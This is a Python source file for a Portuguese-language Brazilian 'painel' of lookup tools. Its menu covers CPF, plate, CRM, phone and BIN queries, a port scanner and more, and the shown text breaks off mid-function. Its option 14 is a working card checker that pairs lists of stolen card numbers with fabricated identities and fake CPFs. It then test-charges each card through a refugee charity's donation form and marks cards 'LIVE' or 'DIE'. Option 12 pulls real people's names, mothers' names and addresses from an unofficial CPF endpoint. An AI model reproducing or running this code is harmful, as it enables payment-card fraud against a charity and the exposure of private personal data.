R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
def restart():
    python = sys.executable
    os.execl(python, python, *sys.argv)
import os
import sys
import base64, json, re
import time
from time import sleep as timeout
try:
    import requests
    import api
    import platform
    import signal
    from colorama import Fore, Style
    import atexit
    import argparse
    import random
    import hashlib
    import urllib3
    from bs4 import BeautifulSoup
    import html5lib
    import phonenumbers
    from phonenumbers import carrier
    from phonenumbers import geocoder
    from phonenumbers import timezone
    from urllib.parse import urlencode
except:
    os.system('pip3 install requests')
    os.system('pip3 install phonenumbers')
    os.system('pip3 install urllib3')
    os.system('pip3 install colorama')
    os.system('pip3 install bs4')
    os.system('pip3 install html5lib')
    os.system('pip3 install argparse')
    print(f'{C}[{Y}i{C}] Reiniciando o painel em 3 seg...')
    time.sleep(3)
    restart()
requests = requests.Session()

#os.system('git pull && clear')
a='aHR0cDovL3d3dy5qdXZlbnR1ZGV3ZWIubXRlLmdvdi5ici9wbnBlcGVzcXVpc2FzLmFzcA=='
a=a.encode('ascii')
a=base64.b64decode(a)
a=a.decode('ascii')

def kinymode():
    print("Opa, como você veio parar aqui?")
    time.sleep(1)
    print("Deseja continuar?[s/n]")
    lero = input("> ")
    if lero =='s' or lero == 'S':
        print("Nova Opção Desbloqueada")
        kiny=1
        menu()
    if lero =='n' or lero == 'N':
        print("Iniciando o script normalmente")
        menu()
    else:
        print("Opção Invalida")
        exit()
def menu():
    import os
    try:
        os.system("pkg update")
        os.system("pkg install figlet")
    except:
        os.system("apt update")
        os.system("apt install figlet")
    os.system("clear")
    print("Coded By: \033[1;36m KINY \033[m and \033[1;36m YATO \033[m in 07/02/2021")
    print()
    os.system("figlet KINY")
    #print(f'{C}[{G}*{C}] Bem vindo,' + user)
    print()
    print("\033[32m{1} BUSCADOR DE CEP\033[m")
    print("\033[32m{2} GEO LOCALIZADOR DE IP\033[m")
    print("\033[32m{3} KINY-SITE-INFOGA\033[m")
    print("\033[32m{4} CONSULTA DE CNPJ\033[m")
    print("\033[32m{5} CONSULTA BANCARIA\033[m")
    print("\033[32m{6} CONSULTA CPF\033[m")
    print("\033[32m{7} CONSULTA CNS\033[m")
    print("\033[32m{8} CONSULTA PLACA\033[m")
    print("\033[32m{9} CONSULTA CRM\033[m")
    print("\033[32m{10} CONSULTA DE NUMERO\033[m")
    print("\033[32m{11} CONSULTA BIN\033[m")
    print("\033[32m{12} GERAR PESSOA\033[m")
    print("\033[32m{13} SCANEAR PORTAS\033[m")
    print("\033[32m{14} CC CHECKER\033[m")
    #print("\033[32m{15} CONSULTA NOME\033[m")
    print()
    print("\033[32m{97} Notas de versão\033[m")
    print("\033[32m{98} Auto-update\033[m")
    print("\033[32m{99} Update && Upgrade\033[m")
    print("\033[32m{00} EXIT\033[m")
    op = input("\033[32m===>\033[m ").strip()
    if op == '98':
        R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
        os.system("bash update.sh")
        print('Painel atualizado.')
    if op == '97':
        R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
        clear()
        print(f'{C}==={R}{C} Notas de versão {C}==={R}{C}')
        print(f'''
        * Bug corrigido no updater
        * Bug corrigido em consultas a placas

        ''')
        print(f'{C}{B}YATO{C} & {C}{B}KINY{C} , 2021')
        pause = input('Pressione enter para retornar.')
        menu()
    if op == '14':
        R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
        def checker(cc,mes,ano,cvv):
            r=requests.request('GET','https://lookup.binlist.net/'+cc[0:6]).json()
            band=r.get('scheme')
            tipo=r.get('type')
            pais=r.get('country')
            banco=r.get('bank')
            nivel=r.get('brand')


            if tipo=='credit':
                tipo2='C'
            else:
                tipo2='D'

            print(f'''
{G}[+]{C}Consultando dados do cartão:
{Y}[*]{C}Cartao: {B}{gg}
{Y}[*]{C}Bandeira: {B}{band}
{Y}[*]{C}Tipo: {B}{tipo}
{Y}[*]{C}Nivel: {B}{nivel}
{Y}[*]{C}Pais: {B}{pais.get('name')}
{Y}[*]{C}Banco: {B}{banco.get('name')}''')

            pessoa=requests.request('GET','https://randomuser.me/api/?nat='+pais.get('alpha2').lower()).json()
            genero=pessoa['results'][0]['gender']
            if genero=='female':
                genero2=genero.replace('female','Mulher')
                genero3='F'
            else:
                genero2=genero.replace('male','Homem')
                genero3='M'
            pnome=pessoa['results'][0]['name']['first']
            sobrenome=pessoa['results'][0]['name']['last']
            nome=pnome +' ' +sobrenome
            nascimento=pessoa['results'][0]['dob']['date'][0:10]
            if pais.get('alpha2')=='BR':
                d=nascimento.split('-')[2]
                m=nascimento.split('-')[1]
                a=nascimento.split('-')[0]
                nascimento=d+'/'+m+'/'+a
            cpf=requests.request('GET','http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()
            cpf2=cpf['data']['number_formatted']
            cpf=cpf['data']['number']
            email=pnome.replace(' ','.')+'.'+sobrenome.replace(' ','.')+'@outlook.com'
            email=email.lower().encode('ascii','ignore').decode('ascii')
            cidade=pessoa['results'][0]['location']['city']
            estado=pessoa['results'][0]['location']['state']
            endereco=pessoa['results'][0]['location']['street']['name']
            cep=str(pessoa['results'][0]['location']['postcode'])
            if pais.get('alpha2')=='BR':
                cep=cep+'-000'
            bairro='Centro'

            for key, value in estados.items():
                estado=estado.replace(key,value)

            print(f'''
{G}[+]{C}Gerando pessoa aleatoria:
{Y}[*]{C}Genero: {B}{genero2}
{Y}[*]{C}Nome: {B}{nome}
{Y}[*]{C}Nascimento: {B}{nascimento}
{Y}[*]{C}CPF: {B}{cpf2}
{Y}[*]{C}E-Mail: {B}{email}
{Y}[*]{C}Endereço: {B}{endereco}
{Y}[*]{C}CEP/ZIP: {B}{cep}
{Y}[*]{C}Cidade: {B}{cidade}
{Y}[*]{C}Estado: {B}{estado}
''')

            donate='https://doar.acnur.org/api/ACNURBR/donate.html'
            h = {
                'Host': 'doar.acnur.org',
                'Connection': 'keep-alive',
                'Content-Length': '1036',
                'Cache-Control': 'max-age\u003d0',
                'Origin': 'https://doar.acnur.org',
                'Upgrade-Insecure-Requests': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.09.4.5083',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3',
                'Sec-Fetch-Site': 'same-origin',
                'Referer': 'https://doar.acnur.org/acnur/donate.html',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7',
                'Cookie': 'ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181'
                }

            data='successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY='+pais.get('currency')+'&EXPDATE='+mes+ano[1:3]+'&TAXID='+cpf+'&AMT=35&TYPE='+tipo2+'%2F'+band+'&PAYPERIOD=MONT&X=&FIRSTNAME='+pnome+'&LASTNAME='+sobrenome+'&EMAIL='+email.replace('@','%40')+'&GENDER='+genero3+'&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1='+nascimento.replace('/','%2F')+'&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1='+nascimento.replace('/','%2F')+'&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET='+endereco.replace(' ','+')+'&STREET2='+bairro.replace(' ','+')+'&CITY='+cidade.replace(' ','+')+'&STATE='+estado+'&ZIP='+cep+'&COUNTRY='+pais.get('alpha2')+'&PHONENUM=%2811%29+98765-4321&CCTYPE='+tipo2+'%2F'+band+'&ACCT='+cc+'&NAME='+nome.replace(' ','+')+'&CVV2='+cvv

            RS=requests.request('POST',donate,headers=h,data=data)
            RS=RS.url
            if RS=='https://doar.acnur.org/acnur/agradecimento.html':
                print(f'{G}[+]{C}Pagamento autorizado! {G}Cartão LIVE!{C}')
            else:
                RS=RS.split('=')[3]

            #Variaveis de retorno de erro
                if RS=='REFUSED_PAYMENT':
                    print(f'{R}[-]{C}Transação recusada ({R}Possivel IP Block{C}).')
                elif RS=='DATA_INVALID':
                    print(f'{R}[-]{C}Cartão invalido ({R}DIE{C}).')
                elif RS=='FAIL_UNKNOWN':
                    print(f'{R}[-]{C}Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).')
                elif RS=='ERROR_NETWORK':
                    print(f'{R}[-]{C}Erro de rede.')
                elif RS=='DATA_CARD_NOT_ALLOWED':
                    print(f'{R}[-]{C}Pagamento nao autorizado.')
                elif RS=='REFUSED_PROVIDER':
                    print(f'{R}[-]{C}Pagamento recusado pela {Y}{band}{C}.')
                elif RS=='REFUSED_BANK':
                    print('{}[-]{}Recusado pelo {}{}{}.'.format(R,C,Y,banco.get('name'),C))
                elif RS=='DATA_MISSING':
                    print(f'{R}[-]{C}Algum dado faltando.')
                else:
                    print(f'{Y}Erro nao listado, confira: {R}{RS}{RT}')

    #Adicionei apenas estados brasileiros e americanos, analisando a request POST, vi que enviava apenas a sigla.
        estados={
            'Acre': 'AC',
            'Alagoas': 'AL',
            'Amapá': 'AP',
            'Amazonas': 'AM',
            'Bahia': 'BA',
            'Ceará': 'CE',
            'Distrito Federal': 'DF',
            'Espírito Santo': 'ES',
            'Goiás': 'GO',
            'Maranhão': 'MA',
            'Mato Grosso': 'MT',
            'Mato Grosso do Sul': 'MS',
            'Minas Gerais': 'MG',
            'Pará': 'PA',
            'Paraíba': 'PB',
            'Paraná': 'PR',
            'Pernambuco': 'PE',
            'Piauí': 'PI',
            'Rio de Janeiro': 'RJ',
            'Rio Grande do Norte': 'RN',
            'Rio Grande do Sul': 'RS',
            'Rondônia': 'RO',
            'Roraima': 'RR',
            'Santa Catarina': 'SC',
            'São Paulo': 'SP',
            'Sergipe': 'SE',
            'Tocantins': 'TO',
            'Alabama': 'AL',
            'Alaska': 'AK',
            'Arizona': 'AZ',
            'Arkansas': 'AR',
            'California': 'CA',
            'Colorado': 'CO',
            'Connecticut': 'CT',
            'Delaware': 'DE',
            'Florida': 'FL',
            'Georgia': 'GA',
            'Hawaii': 'HI',
            'Idaho': 'ID',
            'Illinois': 'IL',
            'Indiana': 'IN',
            'Iowa': 'IA',
            'Kansas': 'KS',
            'Kentucky': 'KY',
            'Louisiana': 'LA',
            'Maine': 'ME',
            'Maryland': 'MD',
            'Massachusetts': 'MA',
            'Michigan': 'MI',
            'Minnesota': 'MN',
            'Mississippi': 'MS',
            'Missouri': 'MO',
            'Montana': 'MT',
            'Nebraska': 'NE',
            'Nevada': 'NV',
            'New Hampshire': 'NH',
            'New Jersey': 'NJ',
            'New Mexico': 'NM',
            'New York': 'NY',
            'North Carolina': 'NC',
            'North Dakota': 'ND',
            'Northern Mariana Islands':'MP',
            'Ohio': 'OH',
            'Oklahoma': 'OK',
            'Oregon': 'OR',
            'Palau': 'PW',
            'Pennsylvania': 'PA',
            'Rhode Island': 'RI',
            'Puerto Rico': 'PR',
            'South Carolina': 'SC',
            'South Dakota': 'SD',
            'Tennessee': 'TN',
            'Texas': 'TX',
            'Utah': 'UT',
            'Vermont': 'VT',
            'Virginia': 'VA',
            'Washington': 'WA',
            'Washington, DC': 'DC',
            'West Virginia': 'WV',
            'Wisconsin': 'WI',
            'Wyoming': 'WY',
            'Virgin Islands': 'VI'
                }
        clear()
        os.system('figlet KINY')
        try:
            lista=open(input(f'{C}Caminho da lista: '), 'r').read().splitlines()
        except:
            print(f'{C}[{R}i{C}] Erro,verifique se é um arquivo.')
            time.sleep(3)
            menu()
        for gg in lista:
            cc=gg.split('|')[0]
            mes=gg.split('|')[1]
            ano=gg.split('|')[2]
            cvv=gg.split('|')[3]
            checker(cc,mes,ano,cvv)
    if op == '13':
        import socket
        def scan(message):
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'

            ip = message.replace('https://', '').replace('http://', '').replace('/scan ', '')

            portas = {
                21: 'ftp',
                22: 'ssh',
                23: 'telnet',
                25: 'smtp',
                53: 'domain',
                80: 'http',
                110: 'pop3',
                111: 'rpcbind',
                135: 'RPC',
                139: 'netbios',
                143: 'imap',
                443: 'https',
                445: 'microsoft-ds',
                993: 'imaps',
                995: 'pop3s',
                1723: 'pptp',
                3306: 'mysql',
                3389: 'RDP',
                5900: 'vnc',
                8080: 'http-proxy'
                }

            texto = ''

            for key, value in portas.items():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                code = s.connect_ex((ip, key))
                if code == 0:
                    texto = texto + f'*Porta* `{key} {value}` *=>* Aberta\n'
                print(texto) if len(texto) > 1 else '`Nenhuma porta aberta`'
                del code
                del texto
                del ip
                print(f'{C}[{Y}i{C}] Deseja realizar uma nova consulta?')
                print('1.Sim')
                print('2.Não')
                choice = input("===>")
                if choice == '1' or choice == '01':
                    choityp()
                if choice == '2' or choice == '02':
                    menu()
                else:
                    print(f'{C}[{R}i{C}] Opção inválida')
                    time.sleep(3)
                    menu()
        def choityp():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            clear()
            os.system('figlet KINY')
            global loufi
            print(f'{C}[{Y}*{C}] Digite o IP.')
            loufi = input('===>')
            scan(loufi)
        choityp()
    if op == '12':
        def gerarPessoa():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'

            while True:
                cpf = requests.get('http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()['data']['number']
                r = requests.get(f'http://104.41.5.41:12345/cpf.php?lista={cpf}').json()
                if r['Type'] == "PESSOAFISICA":
                    print(f'''*CPF*: `{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:11]}`
*Nome*: `{r["Nome"].title()}`
*Nascimento*: `{r["Nacimento"]}`
*Nome da Mae*: `{r["Mae"].title()}`
*Endereco*: `{r["Nologradouro"].title()}, {r["Nrlogradouro"]}`
*Complemento*: `{r["Complemento"].title()}`
*Bairro*: `{r["Bairro"].title()}`
*Cidade*: `{r["Municipio"].title()}-{r["Estado"]}`
*CEP*: `{r["Cep"][:5]}-{r["Cep"][5:]}`''')
                    print(f'{C}[{Y}i{C}] Deseja gerar mais?')
                    print('1.Sim')
                    print('2.Não')
                    choice = input('===>')
                    if choice == '1' or choice == '01':
                        gerarPessoa()
                    if choice == '2' or choice == '02':
                        menu()
                    else:
                        print(f'{C}[{R}i{C}] Opção inválida.')
                        menu()
        clear()
        R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
        print(f'{C}[{G}i{C}] Gerando...')
        gerarPessoa()
    if op == '11':
        def consultabin():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            clear()
            os.system('figlet KINY')
            print('Exemplo:45717360')
            print(f'{C}[{Y}i{C}] Digite a BIN.')
            bin_input = input("===>")
            headers = {"Accept-Version":"3","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
            try:
                req = requests.get('https://lookup.binlist.net/'+bin_input,headers = headers)
                req_data = req.json()
            except:
                print(f'{C}[{R}i{C}] Ocorreu um erro,tente novamente.')
            clear()
            os.system('figlet KINY')
            print('Bandeira: {}'.format(req_data['scheme']))
            print('Marca: {}'.format(req_data['brand']))
            print('Tipo: {}'.format(req_data['type']))
            print('Pais: {}'.format(req_data['country']['name']))
            print('Latitude: {}'.format(req_data['country']['latitude']))
            print('Longitude: {}'.format(req_data['country']['longitude']))
            print('Moeda: {}'.format(req_data['country']['currency']))
            print('Emoji: {}'.format(req_data['country']['emoji']))
            print(f'{C}[{Y}i{C}] Deseja realizar uma nova consulta?')
            print('1.Sim')
            print('2.Não')
            choice = input("===>")
            if choice == '1' or choice == '01':
                consultabin()
            if choice == '2' or choice == '02':
                menu()
            else:
                print(f'{C}[{R}i{C}] Opção inválida')
                time.sleep(3)
                menu()
        consultabin()
    if op == '10':
        def consultaphone():
            api.phone()
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            print(f'{C}[{Y}i{C}]Deseja realizar uma nova consulta?')
            print('1.Sim')
            print('2.Não')
            choice = input("===>")
            if choice == '1' or choice == '01':
                tiposop()
            if choice == '2' or choice == '02':
                menu()
            else:
                print(f'{C}[{R}i{C}] Opção inválida')
                time.sleep(3)
                tiposop()
        def consultaddd():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            clear()
            os.system('figlet KINY')
            for ins in range(1, 999, 1):
                ins = int(input('Digite o DDD: '))

                if ins == 11:
                    print(
                        '⇾ São Paulo e Região Metropolitana /Jundiaí e Aglomeração Urbana /\n São Roque-Mairinque /\n Itu-Salto /\n Bragança Paulista-Atibaia')
                elif ins == 12:
                    print('⇾ São Paulo São José dos Campos e Vale do Paraíba')
                elif ins == 14:
                    print('⇾ São Paulo Bauru/Marília/Jaú/Botucatu')
                elif ins == 15:
                    print('⇾ São Paulo Sorocaba e Itapetininga')
                elif ins == 16:
                    print('⇾ São Paulo Ribeirão Preto/Araraquara/São Carlos')
                elif ins == 17:
                    print('⇾ São Paulo São José do Rio Preto/Barretos')
                elif ins == 18:
                    print('⇾ São Paulo Presidente Prudente/Araçatuba/Assis')
                elif ins == 19:
                    print('⇾ São Paulo Campinas e Região Metropolitana/Piracicaba')
                elif ins == 21:
                    print('⇾ Rio de Janeiro	Rio de Janeiro, Região Metropolitana e Teresópolis')
                elif ins == 22:
                    print('⇾ Rio de Janeiro	Campos dos Goytacazes/Nova Friburgo/Macaé/Cabo Frio')
                elif ins == 24:
                    print('⇾ Rio de Janeiro	Petrópolis/Volta Redonda/Angra dos Reis')
                elif ins == 27:
                    print('⇾ Espírito Santo	Vitória e Região Metropolitana')
                elif ins == 28:
                    print('⇾ Espírito Santo	Cachoeiro de Itapemirim')
                elif ins == 31:
                   print('⇾ Minas Gerais Belo Horizonte, Região Metropolitana e Vale do Aço')
                elif ins == 32:
                    print('⇾ Minas Gerais Juiz de Fora/São João Del Rei')
                elif ins == 33:
                    print('⇾ Minas Gerais Governador Valadares/Teófilo Otoni/Caratinga/Manhuaçu')
                elif ins == 34:
                    print('⇾ Minas Gerais Uberlândia e Triângulo Mineiro')
                elif ins == 35:
                    print('⇾ Minas Gerais Poços de Caldas/Pouso Alegre/Varginha')
                elif ins == 37:
                    print('⇾ Minas Gerais Divinópolis/Itaúna')
                elif ins == 38:
                    print('⇾ Minas Gerais Montes Claros/Diamantina/Noroeste de Minas')
                elif ins == 41:
                    print('⇾ Paraná	Curitiba e Região Metropolitana')
                elif ins == 42:
                    print('⇾ Paraná	Ponta Grossa/Guarapuava')
                elif ins == 43:
                    print('⇾ Paraná	Londrina/Apucarana')
                elif ins == 44:
                    print('⇾ Paraná	Maringá/Campo Mourão/Umuarama')
                elif ins == 45:
                    print('⇾ Paraná	Cascavel/Foz do Iguaçu')
                elif ins == 46:
                    print('⇾ Paraná	Francisco Beltrão/Pato Branco')
                elif ins == 47:
                    print('⇾ Santa Catarina	Joinville/Blumenau/Itajaí/Balneário Camboriú')
                elif ins == 48:
                    print('⇾ Santa Catarina	Florianópolis e Região Metropolitana/Criciúma/Tubarão')
                elif ins == 49:
                    print('⇾ Santa Catarina	Chapecó/Lages/Caçador')
                elif ins == 51:
                    print('⇾ Rio Grande do Sul Porto Alegre e Região Metropolitana/Santa Cruz do Sul/Litoral Norte')
                elif ins == 53:
                    print('⇾ Rio Grande do Sul Pelotas/Rio Grande')
                elif ins == 54:
                    print('⇾ Rio Grande do Sul Caxias do Sul/Passo Fundo')
                elif ins == 55:
                    print('⇾ Rio Grande do Sul Santa Maria/Uruguaiana/Santana do Livramento/Santo Ângelo')
                elif ins == 61:
                    print(
                    '⇾ Distrito Federal/Goiás	Abrangência em todo o Distrito Federal e municípios goianos da Região Integrada de Desenvolvimento do Distrito Federal e Entorno')
                elif ins == 62:
                    print('⇾ Goiás Goiânia e Região Metropolitana/Anápolis/Niquelândia/Porangatu')
                elif ins == 63:
                    print('⇾ Tocantins Abrangência em todo o estado')
                elif ins == 64:
                    print('⇾ Goiás	Rio Verde/Itumbiara/Caldas Novas/Catalão')
                elif ins == 65:
                    print('⇾ Mato Grosso Cuiabá e Região Metropolitana')
                elif ins == 66:
                    print('⇾ Mato Grosso Rondonópolis/Sinop')
                elif ins == 67:
                    print('⇾ Mato Grosso do Sul	Abrangência em todo o estado')
                elif ins == 68:
                    print('⇾ Acre Abrangência em todo o estado')
                elif ins == 69:
                    print('⇾ Rondônia Abrangência em todo o estado')
                elif ins == 71:
                    print('⇾ Bahia Salvador e Região Metropolitana')
                elif ins == 73:
                    print('⇾ Bahia Itabuna/Ilhéus')
                elif ins == 74:
                    print('⇾ Bahia Juazeiro')
                elif ins == 75:
                    print('⇾ Bahia Feira de Santana/Alagoinhas')
                elif ins == 77:
                    print('⇾ Bahia Vitória da Conquista/Barreiras')
                elif ins == 79:
                    print('⇾ Sergipe Abrangência em todo o estado')
                elif ins == 81:
                    print('⇾ Pernambuco	Recife e Região Metropolitana/Caruaru')
                elif ins == 82:
                    print('⇾ Alagoas Abrangência em todo o estado')
                elif ins == 83:
                    print('⇾ Paraíba Abrangência em todo o estado')
                elif ins == 84:
                    print('⇾ Rio Grande do Norte Abrangência em todo o estado')
                elif ins == 85:
                    print('⇾ Ceará Fortaleza e Região Metropolitana')
                elif ins == 86:
                    print('⇾ Piauí Teresina e Região Metropolitana/Parnaíba')
                elif ins == 87:
                    print('⇾ Pernambuco	Petrolina/Garanhuns/Serra Talhada/Salgueiro')
                elif ins == 88:
                    print('⇾ Ceará Juazeiro do Norte/Sobral')
                elif ins == 89:
                    print('⇾ Piauí Picos/Floriano')
                elif ins == 91:
                    print('⇾ Pará Belém/Região Metropolitana')
                elif ins == 92:
                    print('⇾ Amazonas Manaus/Região Metropolitana/Parintins')
                elif ins == 93:
                    print('⇾ Pará Santarém/Altamira')
                elif ins == 94:
                    print('⇾ Pará Marabá')
                elif ins == 95:
                    print('⇾ Roraima Abrangência em todo o estado')
                elif ins == 96:
                    print('⇾ Amapá Abrangência em todo o estado')
                elif ins == 97:
                    print('⇾ Amazonas Abrangência no interior do estado')
                elif ins == 98:
                    print('⇾ Maranhão São Luís e Região Metropolitana')
                elif ins == 99:
                    print('⇾ Maranhão Imperatriz/Caxias')
                print(f'{C}[{Y}i{C}]Deseja realizar uma nova consulta?')
                print('1.Sim')
                print('2.Não')
                choice = input("===>")
                if choice == '1' or choice == '01':
                    tiposop()
                if choice == '2' or choice == '02':
                    menu()
                else:
                    print(f'{C}[{R}i{C}] Opção inválida')
                    time.sleep(3)
                    tiposop()
        def consultaoperadora():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            import requests
            clear()
            os.system("figlet KINY")
            global op_input
            print(f'{C}[{G}i{C}] Exemplo: 48952021826')
            print(f'{C}[{Y}i{C}] Limite de consultas: 6 consultas por hora.')
            print(f'{C}[{Y}i{C}] Digite o numero com DDD.')
            op_input = input("===>")
            headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
            try:
                request = requests.get('http://free.telein.com.br/sistema/consulta_json.php?chave=senhasite&numero='+op_input, headers=headers)
                op_data = request.json()
            except:
                print(f'{C}[{R}i{C}] Limite de consultas atingido')
                print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
                print('1.Sim')
                print('2.Não')
                cho = input("===>")
                if cho == '1' or cho == '01':
                    consultaoperadora()
                if cho == '2' or cho == '02':
                    menu()
                else:
                    print(f'{C}[{R}i{C}] Opção inválida')
            op_final = 'null'
            if (op_data['operadora']) == '553016':
                op_final = 'CLARO'
            if (op_data['operadora']) == '553070':
                op_final = 'OI'
            if (op_data['operadora']) == '553066':
                op_final = 'NEXTEL'
            if (op_data['operadora']) == '553102':
                op_final = 'TIM'
            if (op_data['operadora']) == '553097':
                op_final = 'VIVO'
            elif (op_data['operadora']) == '99':
                print(f'{C}[{R}*{C}] Não foi possível consultar a operadora')
            if op_final == 'null':
                print(f'{C}[{R}*{C}] Operadora invalida.')
            else:
                print(f'{C}[{G}*{C}] Operadora:'+op_final)
            #print(op_data['operadora'])
            print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
            print('1.Sim')
            print('2.Não')
            cho = input("===>")
            if cho == '1' or cho == '01':
                consultaoperadora()
            if cho == '2' or cho == '02':
                menu()
            else:
                print(f'{C}[{R}i{C}] Opção inválida')
                time.sleep(3)
                tiposop()
        def tiposop():
            clear()
            os.system('figlet KINY')
            print(f'O que deseja fazer?')
            print('1.Consultar operadora por numero')
            print('2.Consultar DDD')
            print('3.Phone infoga')
            choi = input('===>')
            if choi == '1' or choi == '01':
                consultaoperadora()
            if choi == '2' or choi == '02':
                consultaddd()
            if choi == '3' or choi == '03':
                consultaphone()
            else:
                print(f'{C}[{R}i{C}] Opção inválida')
                time.sleep(3)
                tiposop()
        tiposop()
    if op == '9' or op == '09':
        def consultacrm():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            import requests
            clear()
            os.system("figlet KINY")
            global crm_input
            global uf_input
            print(f'{C}[{G}i{C}] Digite o numero do CRM.')
            crm_input = input("===>")
            print(f'{C}[{G}i{C}] Digite o UF.')
            uf_input = input("===>")
            url = 'https://www.consultacrm.com.br/api/index.php?tipo=crm&uf='+uf_input
            requests = requests.get(url+'&q={}&chave=5072097263&destino=json'.format(crm_input))
            crm_data = requests.json()
            #consultas = (crm_data['api_limite']) - (crm_data['api_consultas'])
            if (crm_data['status']) == "true":
                #print('Consultas restantes ='+consultas)
                try:
                    print('CRM: {}'.format(crm_data["item"][0]["numero"]))
                    print('Nome: {}'.format(crm_data["item"][0]["nome"]))
                    print('UF: {}'.format(crm_data["item"][0]["uf"]))
                    print('Situacao: {}'.format(crm_data["item"][0]["situacao"]))
                    print('Profissão: {}'.format(crm_data["item"][0]["profissao"]))
                except:
                    print(f'{C}[{R}*{C}] Erro! dados invalidos!')
                    time.sleep(3)
                    consultacrm()
            else:
                print(f'{C}[{R}i{C}] CRM invalido')
            del crm_input
            del uf_input
            del url
            del crm_data
            print(f'{C}[{G}i{C}] Deseja realizar uma nova consulta?')
            print('1.Sim')
            print('2.Não')
            choice = input("===>")
            if choice == "1" or choice == "01":
                consultacrm()
            if choice == "2" or choice == "02":
                menu()
            else:
                print("Opcao invalida.")
        consultacrm()
    if op == '8' or op == '08':
        #def gerarplaca():
        #def tiposplaca():
        #http://api.masterplaca.devplank.com/v2/placa/{placa}/json
        def consultaplaca():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            clear()
            os.system("figlet KINY")
            print(f'{C}[{G}i]{C}Digite o numero da placa.')
            placa_input = input("===>")
            from requests import get
            req = requests.get('https://apicarros.com/v1/consulta/{}/json'.format(placa_input), verify = False) # JSQ7436
            placa_data = req.json()
            clear()
            os.system('figlet KINY')
            try:
                if (placa_data['codigoRetorno']) == "0":
                    print(f"{C}Ano: {B}{placa_data['ano']}{C}")
                    print(f"Data: {B}{placa_data['data']}{C}")
                    print(f"Modelo: {B}{placa_data['modelo']}{C}")
                    print(f"Ano do modelo: {B}{placa_data['anoModelo']}{C}")
                    print(f"Cor: {B}{placa_data['cor']}{C}")
